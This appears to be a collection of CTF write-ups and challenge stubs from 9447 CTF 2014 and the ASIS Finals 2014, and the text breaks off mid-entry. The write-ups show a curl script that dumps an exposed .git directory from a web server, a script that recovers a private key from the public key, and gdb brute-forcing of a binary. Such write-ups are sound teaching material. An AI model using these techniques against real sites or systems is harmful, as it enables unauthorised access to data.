> **Note:** This challenge is the only challenge to break the `9447{string}` flag format. If `$STR` is the solution and the one accepted by the binary, please submit the flag as `9447{$STR}` by manually adding the `9447{}`.
>
> [`rolling`](rolling)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-9447-rolling/>
* <http://dropkickblog.blogspot.com/2014/12/rolling-reversing-100-9447-ctf-201.html>
* <http://theevilbit.blogspot.com/2014/12/9447-ctf-2014-writeup-reversing-125100.html>
* <https://ph0sec.github.io/blog/2014/12/21/9447-ctf-100-rolling-writeup/>
* <http://cregnec.github.io/blog/2014/12/01/9447-ctf-the-challenge-that-ruined-my-day.html>
* <http://barrebas.github.io/blog/2014/12/02/9447-ctf-rolling/>
# 9447 CTF 2014: securestore

**Category:** Exploitation
**Points:** 500
**Solves:** 9
**Description:**

> After the failing of his InSecureStore (TM), Top Secret Agent Steve wants you to test out his new storage program, securestore. See if you can extract the flag.
>
> IP: 54.149.33.9
> Port: 12345
>
> [`securestore`](securestore)

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up + exploit by Ricky Zhou](https://rzhou.org/~ricky/9447_2014/securestore/leak.py) or [here](https://github.com/pwning/public-writeup/blob/master/9447ctf2014/exploitation/securestore/leak.py)
# 9447 CTF 2014: shmap

**Category:** Misc
**Points:** 100
**Solves:** 71
**Description:**

> shmap.9447.plumbing:9447

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/12/9447-security-society-ctf-2014-future-and-shmap-writeup/>
* <https://maltekraus.de/blog/ctf/english/2014/12/01/9447-ctf-shmap-writeup.html>
* <http://blog.dul.ac/2014/12/9447CTF14/>
# 9447 CTF 2014: tumorous

**Category:** Web
**Points:** 100
**Solves:** 224
**Description:**

> They are following me. They are after my token. I have to hide it somewhere. I’m not very good at hiding.
>
> [tumorous.9447.plumbing](http://tumorous.9447.plumbing/)

## Write-up

**Note:** This challenge is a harder version of [the _bashful_ challenge](https://github.com/ctfs/write-ups/tree/master/9447-ctf-2014/bashful#readme).

The page at <http://tumorous.9447.plumbing/> contains:

> 13/2/2004: I learned how to html, yay!
> 12/4/2004: I learned how to use git, yay!
> 13/4/2004: Hidden my 'repository' so people can't access it. I have a feeling I will need to protect something soon.
> 08/9/2004: Forged a token from the whispering iron. It is very dear to me, I should protect it.
> 10/9/2004: I put my token in a text file to protect it from alien mind readers from planet Zblaargh.
> 10/9/2004: I can't forget my token. What do I do?
> 11/9/2004: I panicked and deleted the token. It is the work of evil doers.
> 12/9/2004: My token is lost. My life has no meaning now. I'm going to watch Louie season 4.

The second line hints at Git, so let’s try visiting <http://tumorous.9447.plumbing/.git/>. It returns a 403 Forbidden status code, indicating that the `.git` directory exists on the server, although directory listings are disabled.

An easy way to figure out which files are usually present in a `.git` folder is to create a new Git repository.

```bash
$ cd $(mktemp -d /tmp/tumorous-XXXX)

$ git init

$ cd .git

$ ls -Rls
total 24
8 -rw-r--r--   1 mathias  wheel   23 Nov 30 15:24 HEAD
8 -rwxr--r--   1 mathias  wheel  137 Nov 30 15:24 config
8 -rw-r--r--   1 mathias  wheel   73 Nov 30 15:24 description
0 drwxr-xr-x  11 mathias  wheel  374 Nov 30 15:24 hooks
0 drwxr-xr-x   3 mathias  wheel  102 Nov 30 15:24 info
0 drwxr-xr-x   4 mathias  wheel  136 Nov 30 15:24 objects
0 drwxr-xr-x   4 mathias  wheel  136 Nov 30 15:24 refs

./hooks:
total 80
 8 -rwxr-xr-x  1 mathias  wheel   452 Nov 30 15:24 applypatch-msg.sample
 8 -rwxr-xr-x  1 mathias  wheel   896 Nov 30 15:24 commit-msg.sample
 8 -rwxr-xr-x  1 mathias  wheel   189 Nov 30 15:24 post-update.sample
 8 -rwxr-xr-x  1 mathias  wheel   398 Nov 30 15:24 pre-applypatch.sample
 8 -rwxr-xr-x  1 mathias  wheel  1642 Nov 30 15:24 pre-commit.sample
 8 -rwxr-xr-x  1 mathias  wheel  1352 Nov 30 15:24 pre-push.sample
16 -rwxr-xr-x  1 mathias  wheel  4951 Nov 30 15:24 pre-rebase.sample
 8 -rwxr-xr-x  1 mathias  wheel  1239 Nov 30 15:24 prepare-commit-msg.sample
 8 -rwxr-xr-x  1 mathias  wheel  3611 Nov 30 15:24 update.sample

./info:
total 8
8 -rw-r--r--  1 mathias  wheel  240 Nov 30 15:24 exclude

./objects:
total 0
0 drwxr-xr-x  2 mathias  wheel  68 Nov 30 15:24 info
0 drwxr-xr-x  2 mathias  wheel  68 Nov 30 15:24 pack

./objects/info:

./objects/pack:

./refs:
total 0
0 drwxr-xr-x  2 mathias  wheel  68 Nov 30 15:24 heads
0 drwxr-xr-x  2 mathias  wheel  68 Nov 30 15:24 tags

./refs/heads:

./refs/tags:

```

Now we have a list of files and folders we can look for on the server: `http://tumorous.9447.plumbing/.git/HEAD`, `http://tumorous.9447.plumbing/.git/config`, etc. Let’s recreate the expected directory structure locally, and download these files:

```bash
mkdir -p /tmp/restored-git-repo/.git;
cd /tmp/restored-git-repo/.git;
mkdir -p {hooks,info,objects/{info,pack},refs/{heads,tags}};
for file in HEAD config description info/exclude refs/heads/master; do
  curl "http://tumorous.9447.plumbing/.git/${file}" > "${file}";
done;
cd ..;
```

Whenever we run a Git command in the repository, we get an error:

```bash
$ git log
fatal: bad object HEAD
```

Let’s see what `HEAD` refers to:

```bash
$ cat .git/HEAD
ref: refs/heads/master

$ cat .git/refs/heads/master
3dbda5576912236328494b11f9361dca66c0218a
```

Due to [the way Git stores objects](http://git-scm.com/book/en/v2/Git-Internals-Git-Objects), the object `3dbda5576912236328494b11f9361dca66c0218a` is expected to be at `.git/objects/3d/bda5576912236328494b11f9361dca66c0218a`. Let’s write a function to download such objects based on their hash:

```bash
function fetchobject() {
  hash="${1}";
  dir="${hash:0:2}";
  file="${hash:2:38}";
  mkdir -p ".git/objects/${dir}";
  path=".git/objects/${dir}/${file}";
  curl -s "http://tumorous.9447.plumbing/${path}" > "${path}";
}
```

Now we can easily download the first missing piece, i.e. object `3dbda5576912236328494b11f9361dca66c0218a`:

```bash
$ fetchobject 3dbda5576912236328494b11f9361dca66c0218a
```

Now, let’s try running `git log` again:

```bash
$ git log
error: Could not read 043a18366cb0b2ab31c0f9b14a755a8e597a8b6a
fatal: Failed to traverse parents of commit 3dbda5576912236328494b11f9361dca66c0218a
```

Another missing object! Let’s download it and try again:

```bash
$ fetchobject 043a18366cb0b2ab31c0f9b14a755a8e597a8b6a

$ git log
commit 3dbda5576912236328494b11f9361dca66c0218a
Author: root <root@ip-172-31-5-48.ap-southeast-2.compute.internal>
Date:   Sat Nov 29 03:21:33 2014 +0000

    My token now exists!

commit 043a18366cb0b2ab31c0f9b14a755a8e597a8b6a
Author: John Doe <fsck@you.me>
Date:   Tue Oct 7 08:32:28 2014 +0000

    I'm new to this repo stuff
```

Yay! We can now view the commit log. Effectively this is now a _bare_ Git repository: it contains the repository data but not the actual files. Let’s restore those as well:

```bash
$ git config --local --bool core.bare false

$ git checkout -f
error: unable to read sha1 file of token (0d2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0)

$ fetchobject 0d2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0

$ git checkout -f
error: unable to read sha1 file of index.html (3bba60ef48578d0619aff067c7f6596c1426ce96)

$ fetchobject 3bba60ef48578d0619aff067c7f6596c1426ce96

$ git checkout -f

$ ls
index.html token

$ cat token
9447{IM_SITTING_ON_A_PILE_OF_GOLD}
```

The flag is `9447{IM_SITTING_ON_A_PILE_OF_GOLD}`.

### Alternate solution

This challenge is trivial to solve using [rip-git](https://github.com/kost/dvcs-ripper/blob/master/rip-git.pl):

```bash
$ perl ./rip-git.pl -v -u http://tumorous.9447.plumbing/.git/

$ cat token
9447{IM_SITTING_ON_A_PILE_OF_GOLD}
```

## Other write-ups and resources

* [Write-up by Hypnosec](https://github.com/hypnosec/writeups/blob/master/2014/9447-ctf/web/tumorous.md)
* <http://wiremask.eu/9447-ctf-2014-web-100-tumorous/>
# ASIS Cyber Security Contest Finals 2014: A familiar system

**Category:** Crypto
**Points:** 200
**Description:**

> The flag is encrypted by this [code](crsh_716c88fb8dcc3914b5b5711afecb318e), can you decrypt it after finding the system?

## Write-up

Write-up by [Hacknamstyle](http://hacknamstyle.net). Let’s see what [the provided file](crsh_716c88fb8dcc3914b5b5711afecb318e) could be:

```bash
$ file crsh_716c88fb8dcc3914b5b5711afecb318e
crsh_716c88fb8dcc3914b5b5711afecb318e: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < crsh_716c88fb8dcc3914b5b5711afecb318e > crsh`
* `unxz < crsh_716c88fb8dcc3914b5b5711afecb318e > crsh`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x crsh_716c88fb8dcc3914b5b5711afecb318e
```

Let’s find out what the extracted file is:

```bash
$ file crsh
crsh: POSIX tar archive
```

Let’s extract it:

```bash
$ tar xvf crsh
x crsh/: Refusing to overwrite archive
x crsh/crsh.py
x crsh/flag.enc
tar: Error exit delayed from previous errors.
```

## The Challenge

The file `crsh.py` contains the two functions `makey` and `encrypt`. From this we can already deduce that we will need to use this information to decrypt the file `flag.enc`. First we need to determine the type of encryption used. We make two observations:

1. A random value `q` is chosen, and all operations are performed modulo `q`.
2. In the key generation algorithm, some value `z` is chosen, and then `h = g1**z` is calculated. Variable `z` goes in the private key, while the result `h` goes in the public key.

With this in mind I finally ended up with [ElGamal encryption](https://en.wikipedia.org/wiki/ElGamal_encryption). Once this is known we can look up the decryption algorithm for ElGamal, and apply it to the variables in our challenge:

```python
def decrypt(ciphertext, privkey, pubkey):
    # Unpack key and ciphertext
    x1, x2, y1, y2, z = privkey
    q, g1, g2, c, d, h = pubkey
    u1, u2, e, v = ciphertext

    # Alice calculates s = c_1^x
    s = pow(u1, z, q)
    # and then computes m = c_2 * s^-1
    m = divmod(e * invert(s, q), q)[1]
    return hex(m)[2:].decode("hex")
```

The comments refer to the constants being used on [Wikipedia](https://en.wikipedia.org/wiki/ElGamal_encryption). This is sufficient to decrypt a message **if we know the private key**. For completeness, the challenge actually contains a [Cramer–Shoup cryptosystem](https://en.wikipedia.org/wiki/Cramer%E2%80%93Shoup_cryptosystem). This can be considered an extension of the ElGamal system (but we don't need to be this precise in order to solve the challenge).

All that remains is finding the private key. Let's take a look at the key generation algorithm:

```python
def makey():
	q = next_prime(randint(1, 2**1024))

	x1 = next_prime(randint(1, q-1))
	x2 = next_prime(x1)

	y1 = next_prime(x2)
	y2 = next_prime(y1)

	z = next_prime(y2)

	g1 = next_prime(z)
	g2 = next_prime(g1)

	c = divmod(pow(g1, x1, q)*pow(g2, x2, q), q)[1]
	d = divmod(pow(g1, y1, q)*pow(g2, y2, q), q)[1]
	h = pow(g1, z, q)

	pubkey = (q, g1, g2, c, d, h)
	privkey = (x1, x2, y1, y2, z)
	return (pubkey, privkey)
``` 

We see that it uses `next_prime`, which is a function that can be efficiently inverted. That is, we can create the function `prev_prime`. Now remark that the public key contains the constants `g1` and `g2`. We can calculate `z = prev_prime(g)`. Similarly we can use `prev_prime` to find the values for `y2`, `y1`, `x2`, and `x1`. Hence we can derive the private key from the public key! The solution becomes:

```python
from gmpy import *

def decrypt(ciphertext, privkey, pubkey):
    """"ElGamal Decryption"""
    # Unpack key and ciphertext
    x1, x2, y1, y2, z = privkey
    q, g1, g2, c, d, h = pubkey
    u1, u2, e, v = ciphertext

    # Alice calculates s = c_1^x
    s = pow(u1, z, q)
    # and then computes m = c_2 * s^-1
    m = divmod(e * invert(s, q), q)[1]
    return hex(m)[2:].decode("hex")

def prev_prime(num):
    """"Get the larger prime smaller than num"""
    num -= 1
    while not is_prime(num):
        num -= 1
    return num

def pubkey2privkey(pubkey):
    """"Convert public key to private key using prev_prime"""
    # Unpack pubkey
    q, g1, g2, c, d, h = pubkey
    # Derive private key
    z = prev_prime(g1)  # g1 = next_prime(z)
    y2 = prev_prime(z)  # z = next_prime(y2)
    y1 = prev_prime(y2) # y2 = next_prime(y1)
    x2 = prev_prime(y1) # y1 = next_prime(x2)
    x1 = prev_prime(x2) # x2 = next_prime(x1)
    return (x1, x2, y1, y2, z)

# Apply attack to data in flag.enc
target_pubkey = (mpz(136251271151175798114432982938026229490172110401533005102755262286989049184622583417708312009201423476024122677912469680055108982880741528463299142672020834652185527641834721206398483386320729427665613285937265257500825945169037119499345376317962489316486718729170177878788547880596679146803674652102959291179L), mpz(71445390607919938548377475361074566973666877698962004381686815881759650363064790907205389724727052137547259275540047248324480810969042982358139755944485006293081693292128510719329497724780095449564775706193685016091515868306878669276650004788889866268563082218902602391430478108176895385536441463628368479691L), mpz(71445390607919938548377475361074566973666877698962004381686815881759650363064790907205389724727052137547259275540047248324480810969042982358139755944485006293081693292128510719329497724780095449564775706193685016091515868306878669276650004788889866268563082218902602391430478108176895385536441463628368480207L), mpz(108199964103615859008641230860441564013546022099141268729672372560684354711029024967645311655477601297528967214190176938354612973975648677808462780788853857235728443378937276686560734685975860104201150877752699741509893128491453639598002202233433849963771486923929948182126953422409316505411725704660574071657L), mpz(103402410846165640937714634826853699897953021060814854902226893930824546559478506490958509691172995834949498468163369749905491304339347496145685254419406709457509584848035666518698160042608561655338153398962281529505944744194818819405360595447357300235672126457982381082804720943718414140633702130115821518928L), mpz(116340711871909700306245119761735910172833445394742389374011288239236399789939214131715064909418737704146479936263956091201586261917588169097003026421666887999597157485524925727710226313542982324774527228728935095548200397393540416160234666725112551485046369907177780830026445351468830181648589841619040173447L))
target_c = (mpz(95467029105787819790685969501366652001448206091850219200437950980373198908537653149971642327326341562268633482168133967260392708002179128551446621791484500920123876866983047200450805908685344827646021342534877486305386714673539389693570659549538563696044252832011728553065377412813197782577269476428499901380L), mpz(89595710576920408480354520361707208226997008947621263700559849048228174093448090149075663223527046593283363587635794437708287463841014370347924449040164626126884978025404190308594954049190456014671432009757978067180946291164237407302064238478012485599209052294009083110639149028553486139617037940588192592074L), mpz(57101456812661040956911779152454680172788225654576055105325326802166273530593058160592967123782888106635604456486570389449265108078292983788415457231056869140594423238818468521681863517528522462778250100010993034244098761920700791617733626499616701097597271369053126885898596529980095548583743153472666478505L), mpz(130115388527739990394206680758957845883765682145236104898391558273731695522796485926165074063891018632144470079672768643505790273888231579876368492622104212560577966249611966815224426991815509628590538262064965030005368864440395952711567523963516639208866726152754741399145669201328995650062154785975721499147L))

target_privkey = pubkey2privkey(target_pubkey)
print decrypt(target_c, target_privkey, target_pubkey)

# Result: ASIS_e4e6417b4baebb748da67e33f6e091d5
```

Hence the flag is `ASIS_e4e6417b4baebb748da67e33f6e091d5`.

## Other write-ups and resources

* Write-up by [tasteless](http://tasteless.eu/2014/10/asis-ctf-finals-2014-a-familiar-system/)
* <https://beagleharrier.wordpress.com/2014/10/13/asis-ctf-finals-2014a-familiar-system-writeup/>
# ASIS Cyber Security Contest Finals 2014: Antenna

**Category:** Reverse, PPC
**Points:** 200
**Description:**

> Download [this](antena_bffb7c0bfe9d5eac2e1364ce7ceb995e) file and find the flag.

## Write-up

Let’s see what [the provided file](antena_bffb7c0bfe9d5eac2e1364ce7ceb995e) could be:

```bash
$ file antena_bffb7c0bfe9d5eac2e1364ce7ceb995e
antena_bffb7c0bfe9d5eac2e1364ce7ceb995e: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < antena_bffb7c0bfe9d5eac2e1364ce7ceb995e > antenna`
* `unxz < antena_bffb7c0bfe9d5eac2e1364ce7ceb995e > antenna`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x antena_bffb7c0bfe9d5eac2e1364ce7ceb995e
```

Let’s find out what the extracted file is:

```bash
$ file antenna
antenna: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, stripped
```

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Finals 2014: ASIS calc

**Category:** Reverse
**Points:** 250
**Description:**

> Download the [file](ASIScalc_c4b96a8c1eb9d0881f0c599456d0fceb) and find the flag.

## Write-up

Let’s see what [the provided file](ASIScalc_c4b96a8c1eb9d0881f0c599456d0fceb) could be:

```bash
$ file ASIScalc_c4b96a8c1eb9d0881f0c599456d0fceb
ASIScalc_c4b96a8c1eb9d0881f0c599456d0fceb: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < ASIScalc_c4b96a8c1eb9d0881f0c599456d0fceb > calc`
* `unxz < ASIScalc_c4b96a8c1eb9d0881f0c599456d0fceb > calc`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x ASIScalc_c4b96a8c1eb9d0881f0c599456d0fceb
```

Let’s find out what the extracted file is:

```bash
$ file calc
calc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, stripped
```

We were able to get this executable running on a Debian 8 installation. Let’s explore it:

```bash
$ ./calc
(1+3)*10
40
floor(33.333)
syntax error
sqrt(91)
9.53939
!@#$%^&*()_)(*&^%$#@![];'/.
Unrecognized character: !
Unrecognized character: @
Unrecognized character: #
Unrecognized character: $
syntax error
Unrecognized character: _
Unrecognized character: $
Unrecognized character: #
Unrecognized character: @
Unrecognized character: !
Unrecognized character: [
Unrecognized character: ]
Unrecognized character: ;
Unrecognized character: '
Unrecognized character: .
```

So it’s a real calculator that properly parses input. These things are usually made with Flex/Bison. Is this calculator also made with these tools?

```bash
$ strings calc | grep -i lex
fatal flex scanner internal error--no action found
fatal flex scanner internal error--end of buffer missed
input in flex scanner failed
flex scanner push-back overflow
```

It indeed uses Flex. Let’s load it in IDA and locate where each token is handled. Remember that [Flex](http://flex.sourceforge.net/) converts an input stream (raw ASCII characters) to a token stream (think of them as classes like `NUMBER`, `SUM`, `VARIABLE`, etc). In the screenshot below, the black circle is a switch statement on all possible tokens (each token is represented by a numeric ID):

![Handling Tokens](handle-tokens.png)

After some reversing, it becomes clear what all the tokens in the green circle do. However, the code in the red circle is suspicious: it doesn’t seem to correspond to normal “calculator functionality”. Additionally we also don’t know what kind of token is need to execute this code.

We reverse the code of the unknown token (circled in red). We notice that it loads one _unknown byte value_, and uses this unknown byte to decrypt a buffer on the stack. Once decrypted, this buffer is interpreted as ASCII data and printed to the console.

The solution is to force the execution to the unknown token, try all 256 bytes, let it decrypt and output the buffer, and see whether it contains a flag. We can script this using gdb:

```python
$ cat .gdbinit
set disassembly intel
file ASIScalc
b *0x0401A50
b *0x0402094

python
for i in range(256):
	gdb.execute('r < <(echo "floor(5)")')
	gdb.execute('set $rax=25')
	gdb.execute('c')
	gdb.execute('set $al=%d' % i)
	gdb.execute('c')
```

Eventually it outputs the flag:

	ASIS_cc605aeae2c9a62fa11ba8ae7fd1301e

## Other write-ups and resources

* <https://ctfcrew.org/writeup/82>
# ASIS Cyber Security Contest Finals 2014: CapLow

**Category:** Crypto
**Points:** 75
**Description:**

> Find the flag
> Our new agent encrypt a message like this, let us know what he wanted to say!
> `qvnju181mjziote0zge4mdk0odi4odfmnmnmnmi5zjm2yzy3mq==`

## Write-up

The `==` at the end of the provided ciphertext hints at base64 encoding… But it doesn’t decode to anything useful:

```bash
$ base64 --decode <<< 'qvnju181mjziote0zge4mdk0odi4odfmnmnmnmi5zjm2yzy3mq=='
���_5�<�״����4�ظ���i�h��9��<��
```

It’s a little uncommon for a base64-encoded string to be completely in lowercase like that. Let’s try uppercasing the first few characters:

```bash
$ base64 --decode <<< 'QVNJU181mjziote0zge4mdk0odi4odfmnmnmnmi5zjm2yzy3mq=='
ASIS_5�<�״����4�ظ���i�h��9��<��
```

Aha! That looks like the start of a flag. Let’s continue to uppercase characters one by one, reverting to lowercase only if the change makes the output look worse instead of better. Eventually we end up with `QVNJU181MjZiOTE0ZGE4MDk0ODI4ODFmNmNmNmI5ZjM2YzY3MQ==`:

```bash
$ base64 --decode <<< 'QVNJU181MjZiOTE0ZGE4MDk0ODI4ODFmNmNmNmI5ZjM2YzY3MQ=='
ASIS_526b914da809482881f6cf6b9f36c671
```

The flag is `ASIS_526b914da809482881f6cf6b9f36c671`.

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/10/asis-ctf-finals-2014---caplow-75pts-writeup>
* <https://beagleharrier.wordpress.com/2014/10/13/asis-ctf-finals-2014caplow-writeup/>
# ASIS Cyber Security Contest Finals 2014: Capsule

**Category:** Forensics
**Points:** 125
**Description:**

> Find the flag in this [file](capsule_239acad5fcfe4722e624da66c9c02542).

## Write-up

Let’s see what [the provided file](capsule_239acad5fcfe4722e624da66c9c02542) could be:

```bash
$ file capsule_239acad5fcfe4722e624da66c9c02542
capsule_239acad5fcfe4722e624da66c9c02542: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < capsule_239acad5fcfe4722e624da66c9c02542 > capsule`
* `unxz < capsule_239acad5fcfe4722e624da66c9c02542 > capsule`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x capsule_239acad5fcfe4722e624da66c9c02542
```

Let’s find out what the extracted file is:

```bash
$ file capsule
capsule: data
```

Running `strings capsule` reveals that the file contains the text “Counters provided by dumpcap”. Could this be a broken packet capture file? Let’s try running `pcapfix` on it:

```bash
$ pcapfix capsule
pcapfix 1.1.0 (c) 2012-2014 Robert Krause

[*] Reading from file: capsule
[*] Writing to file: fixed_capsule
[*] File size: 2875396 bytes.
[+] This is a PCAPNG file.
[-] Minor version number: 256 ==> CORRECTED.
[-] Unknown block type!: 0x01000001 ==> SKIPPING.
[-] Block size mismatch (0x00000001 != 0x00000058) ==> CORRECTED.
[-] Found 76 bytes of unknown data ==> SKIPPING.
[-] Missing IDB for Interface #0 ==> CREATING (#0).
[*] Progress:  20.01 %
[*] Progress:  40.01 %
[*] Progress:  60.00 %
[*] Progress:  80.01 %
[+] SUCCESS: 5 Corruption(s) fixed!
```

Now we can open `fixed_capsule` in Wireshark. _Statistics_ → _Protocol Hierarchy_ reveals heavy usage of [AFP](https://nl.wikipedia.org/wiki/Apple_Filing_Protocol). After looking through the traffic for a while, we note that one particular frame contains a response that consists of ASCII art (`frame.number == 9624`).

![](frame.png)

Right-click and select _Copy_ → _Bytes_ → _Printable Text Only_ to get the response:

```
@    _    ____ ___ ____     _____ _  ___   __       ___  _     _       ___      _     _ _  _    __        ___         ___      _           _  _  _____          _                 ___  _    ____   ___
   / \  / ___|_ _/ ___|   |___ // |( _ ) / _| ___ / _ \| |__ / | ___ / _ \  __| | __| | || |  / _| __ _ / _ \  __ _ ( _ )  __| | ___ __ _| || ||___ /  ___  __| | __ _  ___ ___ ( _ )| |__|___ \ / _ \
  / _ \ \___ \| |\___ \     |_ \| |/ _ \| |_ / _ \ | | | '_ \| |/ __| | | |/ _` |/ _` | || |_| |_ / _` | | | |/ _` |/ _ \ / _` |/ __/ _` | || |_ |_ \ / _ \/ _` |/ _` |/ __/ _ \/ _ \| '_ \ __) | | | |
 / ___ \ ___) | | ___) |   ___) | | (_) |  _|  __/ |_| | |_) | | (__| |_| | (_| | (_| |__   _|  _| (_| | |_| | (_| | (_) | (_| | (_| (_| |__   _|__) |  __/ (_| | (_| | (_|  __/ (_) | |_) / __/| |_| |
/_/   \_\____/___|____/___|____/|_|\___/|_|  \___|\___/|_.__/|_|\___|\___/ \__,_|\__,_|  |_| |_|  \__,_|\___/ \__,_|\___/ \__,_|\___\__,_|  |_||____/ \___|\__,_|\__,_|\___\___|\___/|_.__/_____|\___/
                     |_____|
```

This shows the flag `ASIS_318fe0b1c0dd4fa0a8dca43edace8b20` in ASCII art.

----

**Note:** It’s also possible to find the solution by just running `strings` on the damaged packet capture file:

```bash
$ strings -n 100 fixed_capsule
    _    ____ ___ ____     _____ _  ___   __       ___  _     _       ___      _     _ _  _    __        ___         ___      _           _  _  _____          _                 ___  _    ____   ___
   / \  / ___|_ _/ ___|   |___ // |( _ ) / _| ___ / _ \| |__ / | ___ / _ \  __| | __| | || |  / _| __ _ / _ \  __ _ ( _ )  __| | ___ __ _| || ||___ /  ___  __| | __ _  ___ ___ ( _ )| |__|___ \ / _ \
  / _ \ \___ \| |\___ \     |_ \| |/ _ \| |_ / _ \ | | | '_ \| |/ __| | | |/ _` |/ _` | || |_| |_ / _` | | | |/ _` |/ _ \ / _` |/ __/ _` | || |_ |_ \ / _ \/ _` |/ _` |/ __/ _ \/ _ \| '_ \ __) | | | |
 / ___ \ ___) | | ___) |   ___) | | (_) |  _|  __/ |_| | |_) | | (__| |_| | (_| | (_| |__   _|  _| (_| | |_| | (_| | (_) | (_| | (_| (_| |__   _|__) |  __/ (_| | (_| | (_|  __/ (_) | |_) / __/| |_| |
/_/   \_\____/___|____/___|____/|_|\___/|_|  \___|\___/|_.__/|_|\___|\___/ \__,_|\__,_|  |_| |_|  \__,_|\___/ \__,_|\___/ \__,_|\___\__,_|  |_||____/ \___|\__,_|\__,_|\___\___|\___/|_.__/_____|\___/
                     |_____|
…
```

## Other write-ups and resources

* <http://shankaraman.wordpress.com/2014/10/13/asis-ctf-2014-finals-capsule-writeup/>
* <http://www.mrt-prodz.com/blog/view/2014/10/asis-ctf-finals-2014---capsule-125pts-writeup>
# ASIS Cyber Security Contest Finals 2014: Echo

**Category:** PPC
**Points:** 200
**Description:**

> Connect there:
>
> ```bash
> nc asis-ctf.ir 12433
> ```

## Write-up

Let’s connect to the service:

```bash
$ nc asis-ctf.ir 12433
Go Ahead and find flag :D
```

The service seems to just echo whatever we send it:

```bash
$ nc asis-ctf.ir 12433
Go Ahead and find flag :D
a # ← our input
a # ← response
b
b
```

When the word `flag` is used, the service sends an additional response:

```bash
$ nc asis-ctf.ir 12433
Go Ahead and find flag :D
flag
flag
Kidding Me!
```

When exactly two characters are sent, you get yet another response:

```bash
$ nc asis-ctf.ir 12433
Go Ahead and find flag :D
aa
aa
Be smart!
```

After a lot of trial and error, we discover that the server responds ‘Perfect!’ the first time you send `hi` in the session:

```bash
$ nc asis-ctf.ir 12433
Go Ahead and find flag :D
hi
hi
Perfect!
hi
hi
Be smart!
```

We wrote a script that sends every possible combination of two printable ASCII characters to the service, and let it run for a while. Apparently this is the order of messages the service expected (i.e. you get the ‘Perfect!’ response for each of these if you enter them in this order):

```
"hi"
" a"
"ll"
", "
"wa"
"rm"
"up"
" r"
"ou"
"nd"
"! "
"th"
"e "
"fl"
"ag"
" i"
"s "
"AS"
"IS"
"_7"
"17"
"ef"
"53"
"de"
"3a"
"7c"
"90"
"80"
"ef"
"d2"
"bc"
"2b"
"a5"
"d0"
"d0"
```

This gave us the flag except for the last digit. But since we know it’s a hex digit, we can try all options and see which one gets accepted. The flag turned out to be `ASIS_717ef53de3a7c9080efd2bc2ba5d0d05`.

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Finals 2014: Fact or Real?

**Category:** Recon
**Points:** 25
**Description:**

> `ASIS_md5(motto)`

## Write-up

_factoreal_ is one of the organizers of this CTF. On [his Twitter account](https://twitter.com/factoreal) we find [a tweet with the text “fact or real:” followed by an image that says `NO+$=YES`](https://twitter.com/factoreal/status/486459604973662208).

```bash
$ md5 -s 'NO+$=YES'
MD5 ("NO+$=YES") = d25b9c2f1c29e49e81e8fdfaf4d16fc6
```

The flag is `ASIS_d25b9c2f1c29e49e81e8fdfaf4d16fc6`.

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/10/asis-ctf-finals-2014---fact-or-real-75pts-writeup>
# ASIS Cyber Security Contest Finals 2014: How much exactly?

**Category:** Trivia
**Points:** 25
**Description:**

> 4046925: How much the exact IM per year?
>
> `flag=ASIS_md5(size)`

## Write-up

Googling for ‘4046925’ leads to [NSA DOCID: 4046925 Untangling the Web: A Guide to Internet Research](https://www.nsa.gov/public_info/_files/untangling_the_web.pdf). Searching that document for “instant messaging” (IM), we find:

> Instant messaging generates five billion messages a day (750GB), or 274 Terabytes a year.

```bash
$ md5 -s '274'
MD5 ("274") = d947bf06a885db0d477d707121934ff8
```

The flag is `ASIS\_d947bf06a885db0d477d707121934ff8`.

## Other write-ups and resources

* <http://dhanvi1.wordpress.com/2014/10/23/how-much-exactly-asis-2014-trivia-25-writeup/>
* <https://hackucf.org/blog/asis-2014-trivia-25-how-much-exactly/>
* <http://www.mrt-prodz.com/blog/view/2014/10/asis-ctf-finals-2014---how-much-exactly-25pts-writeup>
* <http://bruce30262.logdown.com/posts/237386-asis-ctf-finals-2014-how-much-exactly-lottery>
# ASIS Cyber Security Contest Finals 2014: Important day!

**Category:** Forensics
**Points:** 100
**Description:**

> When did the computer start? Download this [file](impday_92fe19a8b4b2ad415e9d8e1e6aba67aa)
>
> `flag = ASIS_md5(time), time = ~$ date +%Y:%m:%d:%H:%M`

## Write-up

### Analyzing the provided file

Let’s see what [the provided file](impday_92fe19a8b4b2ad415e9d8e1e6aba67aa) could be:

```bash
$ file impday_92fe19a8b4b2ad415e9d8e1e6aba67aa
impday_92fe19a8b4b2ad415e9d8e1e6aba67aa: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < impday_92fe19a8b4b2ad415e9d8e1e6aba67aa > impday`
* `unxz < impday_92fe19a8b4b2ad415e9d8e1e6aba67aa > impday`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x impday_92fe19a8b4b2ad415e9d8e1e6aba67aa
```

Let’s find out what the extracted file is:

```bash
$ file impday
impday: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 1514)
```

### Intended solution

